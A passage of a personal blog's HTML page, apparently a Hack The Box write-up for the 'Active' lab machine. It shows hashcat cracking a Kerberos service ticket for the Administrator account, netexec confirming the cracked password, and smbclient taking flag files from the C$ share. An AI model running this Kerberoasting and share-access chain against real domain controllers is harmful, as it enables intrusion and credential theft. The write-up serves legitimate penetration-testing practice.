4e3570e0117fe95fffb26d0c73108e70ea18676a782df44edb0f130dbbdf3a2dab4e8d06ab37a40ad011eb617b64915e8f65826a3c265795a902cc4e4ac7
+</span></span></code></pre></div><p>Then we can attempt to crack the hash with hashcat.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo hashcat -m <span style="color:#ae81ff">13100</span> cifs_tgs /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>hashcat (v6.2.6) starting
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6f9b717f04df30f727e5c41fe3050add$388b409d034f71f7418ad09f74b1a37e03d4235811ca47f863c447d011d6af01eaa9e06ae542676f6c403dd130511a24fb25144d3e6bb8328cfd59a47ef5497b622bc341419d8a1f3354d99ead4775c6bfabccd984ffe9c5870402a93f3264a324d1522f49a1181a41a05c95809f2d1d8bb753b588a80e98bbdf03544a28c65772fe02b7f7657b4588ce118be95575d8cf2f16e547cd414a8bd129d3371940581b5f988d1dda0207b2b82e1f0072e7aad119fd0142e34b1692e1379a0199a353a9e37adbcb6be70f3dd35da223e3633af933c1a7479b436ec87c1298e9df228a94db4ce7fc4eb4bd5035851c3116ee64ab3bf99288045d91d7796e6415df64237db69d2f73e076e8ade993e91ddd625c6fac5f5d8d562e0c9a1f660cc5264f57118d9d2b2fc56f991e3204670c4693a464bd9536420f57174052ef72843323ca68bf68ef033b3c84e8161bf57c53302c280db635b42eee3325ce98e348ace80c755225ccec5d8eb435f24c5b7f6c4a576d41c21723a8f7ca9e1473081c33a357a0685ec249b1864d2ead4b20d11133976f872261bdf8706a1296e74755212084937a3d2ef8e18086235f1b7e1b4a15a0231f629afa8124c401435dcaa72f712295cf8ef3943c63a3ffd5f3eadb46fed98d888e0f2d0b7d3c977e6e01aeeb50c18aca430d19e89cf4ec72583db85a79b46b551a5b16b6440cfaf89755cfe7774dacdb7f0c232e3a928cd6f038dc7a6fcce22ec3c25808999b86f69f996fc2dee1913b951cf4ca15900e1df087279d4dd405f8857286cf7c362b10c5c1e23537f1100e3db27cc69367c43e4f9f4464c776e283787420e9c88a4f652518d2e3762746a617dcc38fd2b9c5462343d845e58b228c31cd1394e966fdadde41cdb12d2a05f5d6aadb9ae4310e8999bcfe5ef21a7a8c38f896b92a3a98ba8dbb9e8162ed34812f88c1ec98bf8abc4f7516bf2a2f2ea68abbc1ba1bd5f96564913720c5a9e3e8ed1990eda54f6662e28e39c78e33ef0e7c7d70824538d0061e02ca77b68ca56fa8784cdc675396cf5a5e2de05638d8457db03c4e6ea8ede05ea77a72f82d7340a52ab829b66e6d0629bc1b408d38cb9baf7cf0b9d31b5f6f8d7da0fcf9bf8023ca3e3ae344b17eeacc6ac7c0648fe16ddb493a7eef7f3f9ffed24e3570e0117fe95fffb26d0c73108e70ea18676a782df44edb0f130dbbdf3a2dab4e8d06ab37a40ad011eb617b64915e8f65826a3c265795a902cc4e4ac7:Ticketmaster1968
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span></code></pre></div><p>And we crack it! We try to use the Administrator account to discover more users with netexec, and notice that there aren&rsquo;t really any users we can see. Netexec also confirms that we have the correct password for the active.htb\Administrator account.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo netexec smb 10.10.10.100 -u Administrator -p Ticketmaster1968 --users
+</span></span><span style="display:flex;"><span>[*] First time use detected
+</span></span><span style="display:flex;"><span>[*] Creating home directory structure
+</span></span><span style="display:flex;"><span>[*] Creating missing folder logs
+</span></span><span style="display:flex;"><span>[*] Creating missing folder modules
+</span></span><span style="display:flex;"><span>[*] Creating missing folder protocols
+</span></span><span style="display:flex;"><span>[*] Creating missing folder workspaces
+</span></span><span style="display:flex;"><span>[*] Creating missing folder obfuscated_scripts
+</span></span><span style="display:flex;"><span>[*] Creating missing folder screenshots
+</span></span><span style="display:flex;"><span>[*] Creating default workspace
+</span></span><span style="display:flex;"><span>[*] Initializing MSSQL protocol database
+</span></span><span style="display:flex;"><span>[*] Initializing SMB protocol database
+</span></span><span style="display:flex;"><span>[*] Initializing FTP protocol database
+</span></span><span style="display:flex;"><span>[*] Initializing LDAP protocol database
+</span></span><span style="display:flex;"><span>[*] Initializing RDP protocol database
+</span></span><span style="display:flex;"><span>[*] Initializing SSH protocol database
+</span></span><span style="display:flex;"><span>[*] Initializing VNC protocol database
+</span></span><span style="display:flex;"><span>[*] Initializing WINRM protocol database
+</span></span><span style="display:flex;"><span>[*] Initializing WMI protocol database
+</span></span><span style="display:flex;"><span>[*] Copying default configuration file
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               Administrator                 2018-07-18 19:06:40 0       Built-in account for administering the computer/domain
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               krbtgt                        2018-07-18 18:50:36 0       Key Distribution Center Service Account
+</span></span><span style="display:flex;"><span>SMB         10.10.10.100    445    DC               SVC_TGS                       2018-07-18 20:14:38 0
+</span></span></code></pre></div><p>As the Administrator, I think we can just access the drives from SMB. Let&rsquo;s go to the C$ drive.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$smbclient //10.10.10.100/C$ -U <span style="color:#e6db74">&#39;Administrator&#39;</span>
+</span></span><span style="display:flex;"><span>Password for [WORKGROUP\Administrator]:
+</span></span><span style="display:flex;"><span>Try &#34;help&#34; to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: \&gt; ls
+</span></span><span style="display:flex;"><span>  $Recycle.Bin                      DHS        0  Mon Jul 13 22:34:39 2009
+</span></span><span style="display:flex;"><span>  Documents and Settings          DHSrn        0  Tue Jul 14 01:06:44 2009
+</span></span><span style="display:flex;"><span>  pagefile.sys                      AHS 5041647616  Sat Feb  1 05:17:04 2025
+</span></span><span style="display:flex;"><span>  PerfLogs                            D        0  Mon Jul 13 23:20:08 2009
+</span></span><span style="display:flex;"><span>  Program Files                      DR        0  Wed Jan 12 08:11:58 2022
+</span></span><span style="display:flex;"><span>  Program Files (x86)                DR        0  Thu Jan 21 11:49:16 2021
+</span></span><span style="display:flex;"><span>  ProgramData                       DHn        0  Wed Jan 12 08:09:27 2022
+</span></span><span style="display:flex;"><span>  Recovery                         DHSn        0  Mon Jul 16 06:13:22 2018
+</span></span><span style="display:flex;"><span>  System Volume Information         DHS        0  Wed Jul 18 14:45:01 2018
+</span></span><span style="display:flex;"><span>  Users                              DR        0  Sat Jul 21 10:39:20 2018
+</span></span><span style="display:flex;"><span>  Windows                             D        0  Sun Feb  2 01:32:54 2025
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>                5217023 blocks of size 4096. 273330 blocks available
+</span></span></code></pre></div><p>Let&rsquo;s grab the user flag for SVC_TGS while we are here (maybe we could have found this earlier with just the SVC_TGS account).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>smb: \Users\SVC_TGS\Desktop\&gt; get user.txt
+</span></span><span style="display:flex;"><span>getting file \Users\SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+</span></span></code></pre></div><p>Then get the root flag in the Administrator&rsquo;s Desktop folder.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>smb: \Users\Administrator\Desktop\&gt; get root.txt
+</span></span><span style="display:flex;"><span>getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec
+</span></span></code></pre></div><p>Wow, that was pretty easy and straight-forward.</p>
+
+</content>
+<p>
+  
+  <a href="https://jordangalida.github.io/blog/htb/">#HTB</a>
+  
+  <a href="https://jordangalida.github.io/blog/pentesting/">#Pentesting</a>
+  
+</p>
+
+  </main>
+  <footer>Made with <a href="https://github.com/janraasch/hugo-bearblog/">Hugo ʕ•ᴥ•ʔ Bear</a>
+</footer>
+
+    
+</body>
+
+</html>
